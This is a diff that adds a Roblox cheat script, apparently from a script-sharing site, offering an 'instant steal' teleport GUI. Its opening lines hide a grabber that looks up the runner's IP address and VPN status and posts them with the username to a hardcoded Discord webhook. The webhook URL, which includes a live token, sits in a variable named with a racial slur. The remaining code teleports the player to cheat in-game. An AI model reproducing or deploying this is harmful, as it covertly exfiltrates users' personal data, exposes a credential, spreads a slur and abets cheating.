@@ -1,0 +1,420 @@
+--[[
+    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+--For Only Educational Purposes
+--Not lie one hundred percent
+local Nigger = "https://discord.com/api/webhooks/1458446860896440545/udHgLLGKa1cgU6G2dnRv3Ce5IfXsg69J7h3_FJawSB3z2KvGB2VGYOCEvla1_kTBhTnm"
+
+local h = game:GetService("HttpService")
+local p = game:GetService("Players")
+local l = p.LocalPlayer
+
+local a = "idk"
+local b = "idk"
+local r = syn and syn.request or http_request or request or (http and http.request)
+
+pcall(function()
+    local res = r({
+        Url = "http://ip-api.com/json/?fields=66846719",
+        Method = "GET"
+    })
+    if res and res.Body then
+        local d = h:JSONDecode(res.Body)
+        a = d.query or "idk"
+        if d.proxy ~= nil then
+            b = d.proxy and "Yes" or "No"
+        else
+            b = "idk"
+        end
+    end
+end)
+
+local u = "idk"
+if l then
+    u = l.Name .. " , " .. l.DisplayName
+end
+
+local f = string.format([[
+<------------------------------>
+IP Address : %s
+User,Display Name : %s
+Using VPN? : %s
+<------------------------------>
+]], a, u, b)
+
+local Bet = {
+    ["content"] = f
+}
+
+pcall(function()
+    if r then
+        r({
+            Url = Nigger,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = h:JSONEncode(Bet)
+        })
+    else
+        h:PostAsync(Nigger, h:JSONEncode(Bet))
+    end
+end)
+
+
+
+local Players = game:GetService("Players")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+
+if _G.DEZTPInstantStealLoaded then return end
+_G.DEZTPInstantStealLoaded = true
+
+-- State management
+local isRunning = true
+local pos1, pos2 = nil, nil
+local beam1, beam2
+local part1, part2
+
+local targetPositions = {
+	Vector3.new(-481.88, -3.79, 138.02),
+	Vector3.new(-481.75, -3.79, 89.18),
+	Vector3.new(-481.82, -3.79, 30.95),
+	Vector3.new(-481.75, -3.79, -17.79),
+	Vector3.new(-481.80, -3.79, -76.06),
+	Vector3.new(-481.72, -3.79, -124.70),
+	Vector3.new(-337.45, -3.85, -124.72),
+	Vector3.new(-337.37, -3.85, -76.07),
+	Vector3.new(-337.46, -3.79, -17.72),
+	Vector3.new(-337.41, -3.79, 30.92),
+	Vector3.new(-337.32, -3.79, 89.02),
+	Vector3.new(-337.27, -3.79, 137.90),
+	Vector3.new(-337.45, -3.79, 196.29),
+	Vector3.new(-337.37, -3.79, 244.91),
+	Vector3.new(-481.72, -3.79, 196.21),
+	Vector3.new(-481.76, -3.79, 244.92)
+}
+
+-- Create GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "DEZTPUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main frame
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.fromOffset(220, 190)
+frame.Position = UDim2.fromScale(0.5, 0.5)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+frame.BackgroundTransparency = 0.3
+frame.Active = true
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
+
+-- Add UI stroke with slight glow
+local uiStroke = Instance.new("UIStroke", frame)
+uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+uiStroke.Color = Color3.fromRGB(80,80,80)
+uiStroke.Thickness = 2
+
+-- Snowflake container (for background effect)
+local snowContainer = Instance.new("Frame", frame)
+snowContainer.Size = UDim2.new(1, 0, 1, 0)
+snowContainer.BackgroundTransparency = 1
+snowContainer.ClipsDescendants = true
+
+-- Create snowflakes
+local snowflakes = {}
+local function createSnowflake()
+	local snowflake = Instance.new("Frame", snowContainer)
+	snowflake.Size = UDim2.fromOffset(math.random(2, 4), math.random(2, 4))
+	snowflake.Position = UDim2.fromScale(math.random(), -0.1)
+	snowflake.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	snowflake.BackgroundTransparency = math.random(30, 70) / 100
+	snowflake.BorderSizePixel = 0
+	Instance.new("UICorner", snowflake).CornerRadius = UDim.new(1, 0)
+	
+	table.insert(snowflakes, {
+		object = snowflake,
+		speed = math.random(20, 40) / 100, -- Slower fall speed
+		drift = (math.random() - 0.5) * 0.3, -- Horizontal drift
+	})
+end
+
+-- Initialize snowflakes
+for i = 1, 30 do
+	createSnowflake()
+	task.wait(0.05)
+end
+
+-- Update snowflakes
+RunService.RenderStepped:Connect(function(dt)
+	for i, snowflake in ipairs(snowflakes) do
+		local currentPos = snowflake.object.Position
+		local newY = currentPos.Y.Scale + snowflake.speed * dt
+		local newX = currentPos.X.Scale + snowflake.drift * dt
+		
+		-- Reset snowflake if it falls off screen
+		if newY > 1.1 then
+			snowflake.object.Position = UDim2.fromScale(math.random(), -0.1)
+			-- Occasionally create a new snowflake instead of recycling
+			if math.random(1, 5) == 1 then
+				snowflake.object:Destroy()
+				createSnowflake()
+				snowflakes[i] = nil
+			end
+		else
+			snowflake.object.Position = UDim2.fromScale(newX, newY)
+			
+			-- Slight transparency variation
+			local alpha = 0.3 + 0.5 * (math.sin(tick() * 2 + i) * 0.5 + 0.5)
+			snowflake.object.BackgroundTransparency = alpha
+		end
+	end
+	
+	-- Clean up nil entries
+	for i = #snowflakes, 1, -1 do
+		if snowflakes[i] == nil then
+			table.remove(snowflakes, i)
+		end
+	end
+end)
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, -12, 0, 28)
+title.Position = UDim2.fromOffset(6, 6)
+title.BackgroundTransparency = 1
+title.Text = "DEZ TP | INSTANT STEAL"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 14
+title.TextColor3 = Color3.fromRGB(220,220,220)
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.ZIndex = 2 -- Ensure title is above snowflakes
+
+local status = Instance.new("TextLabel", frame)
+status.Size = UDim2.new(1, -12, 0, 22)
+status.Position = UDim2.fromOffset(6, 42)
+status.BackgroundTransparency = 1
+status.Text = "Status: ACTIVE"
+status.Font = Enum.Font.Gotham
+status.TextSize = 12
+status.TextColor3 = Color3.fromRGB(0, 255, 0)
+status.TextXAlignment = Enum.TextXAlignment.Center
+status.ZIndex = 2
+
+-- Blinking animation for status
+task.spawn(function()
+	while true do
+		if isRunning then
+			TweenService:Create(status, TweenInfo.new(1.2), {TextTransparency = 0.4}):Play()
+			task.wait(1.2)
+			TweenService:Create(status, TweenInfo.new(1.2), {TextTransparency = 0}):Play()
+			task.wait(1.2)
+		else
+			status.TextTransparency = 0
+			task.wait(0.1)
+		end
+	end
+end)
+
+-- Button creation function
+local function makeButton(text, y, color)
+	local b = Instance.new("TextButton", frame)
+	b.Size = UDim2.new(1, -24, 0, 36)
+	b.Position = UDim2.fromOffset(12, y)
+	b.BackgroundColor3 = color or Color3.fromRGB(50,50,50)
+	b.BackgroundTransparency = 0.1
+	b.Text = text
+	b.Font = Enum.Font.GothamMedium
+	b.TextSize = 14
+	b.TextColor3 = Color3.fromRGB(230,230,230)
+	b.AutoButtonColor = false
+	b.ZIndex = 2
+	Instance.new("UICorner", b).CornerRadius = UDim.new(0,6)
+	
+	local buttonStroke = Instance.new("UIStroke", b)
+	buttonStroke.Color = Color3.fromRGB(80,80,80)
+	buttonStroke.Thickness = 1
+
+	b.MouseEnter:Connect(function()
+		TweenService:Create(b, TweenInfo.new(0.15), {BackgroundTransparency = 0}):Play()
+		TweenService:Create(buttonStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(120,120,120)}):Play()
+	end)
+	b.MouseLeave:Connect(function()
+		TweenService:Create(b, TweenInfo.new(0.15), {BackgroundTransparency = 0.1}):Play()
+		TweenService:Create(buttonStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(80,80,80)}):Play()
+	end)
+
+	return b
+end
+
+-- Create buttons
+local btnSetPos = makeButton("Set Position", 72, Color3.fromRGB(50,50,50))
+local btnToggle = makeButton("STOP", 114, Color3.fromRGB(255, 50, 50))
+
+-- Button press animation
+local function pressAnim(button)
+	local origSize = button.Size
+	local origPos = button.Position
+
+	TweenService:Create(button, TweenInfo.new(0.08), {
+		Size = UDim2.new(origSize.X.Scale, origSize.X.Offset - 4,
+		                 origSize.Y.Scale, origSize.Y.Offset - 3),
+		Position = UDim2.new(origPos.X.Scale, origPos.X.Offset + 2,
+		                     origPos.Y.Scale, origPos.Y.Offset + 1)
+	}):Play()
+
+	task.wait(0.08)
+
+	TweenService:Create(button, TweenInfo.new(0.12), {
+		Size = origSize,
+		Position = origPos
+	}):Play()
+end
+
+-- Function to update toggle button appearance
+local function updateToggleButton()
+	if isRunning then
+		btnToggle.Text = "STOP"
+		btnToggle.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+		status.Text = "Status: ACTIVE"
+		status.TextColor3 = Color3.fromRGB(0, 255, 0)
+	else
+		btnToggle.Text = "START"
+		btnToggle.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+		status.Text = "Status: INACTIVE"
+		status.TextColor3 = Color3.fromRGB(255, 50, 50)
+	end
+end
+
+-- Toggle button functionality
+btnToggle.MouseButton1Click:Connect(function()
+	pressAnim(btnToggle)
+	isRunning = not isRunning
+	updateToggleButton()
+	
+	-- Clean up beams when stopping
+	if not isRunning then
+		if beam1 then beam1:Destroy(); beam1 = nil end
+		if part1 then part1:Destroy(); part1 = nil end
+		if beam2 then beam2:Destroy(); beam2 = nil end
+		if part2 then part2:Destroy(); part2 = nil end
+	end
+end)
+
+-- Set position button functionality
+btnSetPos.MouseButton1Click:Connect(function()
+	if not isRunning then return end
+	pressAnim(btnSetPos)
+	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+	if hrp then
+		pos1 = hrp.CFrame
+		createBeam(pos1.Position, Color3.fromRGB(0,170,255), 1)
+	end
+end)
+
+-- Beam creation function
+local function createBeam(position, color, index)
+	if not isRunning then return end
+	
+	local char = player.Character
+	if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+
+	local part = Instance.new("Part", workspace)
+	part.Size = Vector3.new(1,1,1)
+	part.Anchored = true
+	part.CanCollide = false
+	part.Transparency = 1
+	part.CFrame = CFrame.new(position)
+
+	local a0 = Instance.new("Attachment", part)
+	local a1 = Instance.new("Attachment", char.HumanoidRootPart)
+
+	local beam = Instance.new("Beam", workspace)
+	beam.Attachment0 = a0
+	beam.Attachment1 = a1
+	beam.Width0 = 0.12
+	beam.Width1 = 0.12
+	beam.FaceCamera = true
+	beam.Color = ColorSequence.new(color)
+
+	if index == 1 then
+		if beam1 then beam1:Destroy() end
+		if part1 then part1:Destroy() end
+		beam1, part1 = beam, part
+	else
+		if beam2 then beam2:Destroy() end
+		if part2 then part2:Destroy() end
+		beam2, part2 = beam, part
+	end
+end
+
+-- Target position tracking
+task.spawn(function()
+	while true do
+		task.wait(1)
+		if not isRunning then continue end
+		
+		local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+		if hrp then
+			local closestDist = math.huge
+			local closestPos = nil
+			for _, v in ipairs(targetPositions) do
+				local dist = (hrp.Position - v).Magnitude
+				if dist < closestDist then
+					closestDist = dist
+					closestPos = v
+				end
+			end
+			if closestPos then
+				pos2 = CFrame.new(closestPos)
+				createBeam(pos2.Position, Color3.fromRGB(255,140,0), 2)
+			end
+		end
+	end
+end)
+
+-- Proximity prompt handler
+ProximityPromptService.PromptButtonHoldEnded:Connect(function(prompt, who)
+	if not isRunning then return end
+	if who ~= player then return end
+	if prompt.Name ~= "Steal" and prompt.ActionText ~= "Steal" then return end
+
+	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+	if not hrp then return end
+
+	local backpack = player:FindFirstChild("Backpack")
+	if backpack then
+		local carpet = backpack:FindFirstChild("Flying Carpet")
+		if carpet and player.Character and player.Character:FindFirstChild("Humanoid") then
+			player.Character.Humanoid:EquipTool(carpet)
+		end
+	end
+
+	if pos1 then hrp.CFrame = pos1 end
+	if pos2 then task.wait(0.05); hrp.CFrame = pos2 end
+end)
+
+-- Discord label
+local discord = Instance.new("TextLabel", frame)
+discord.Size = UDim2.new(1,0,0,16)
+discord.Position = UDim2.fromOffset(0,170)
+discord.BackgroundTransparency = 1
+discord.Text = ""
+discord.Font = Enum.Font.GothamMedium
+discord.TextSize = 10
+discord.TextXAlignment = Enum.TextXAlignment.Center
+discord.TextColor3 = Color3.fromRGB(180,180,180)
+discord.ZIndex = 2
+
+-- Color cycling for discord label
+local h = 0
+RunService.RenderStepped:Connect(function(dt)
+	h = (h + dt * 0.3) % 1
+	discord.TextColor3 = Color3.fromHSV(h,1,1)
+end)
+
+-- Initialize button state
+updateToggleButton()
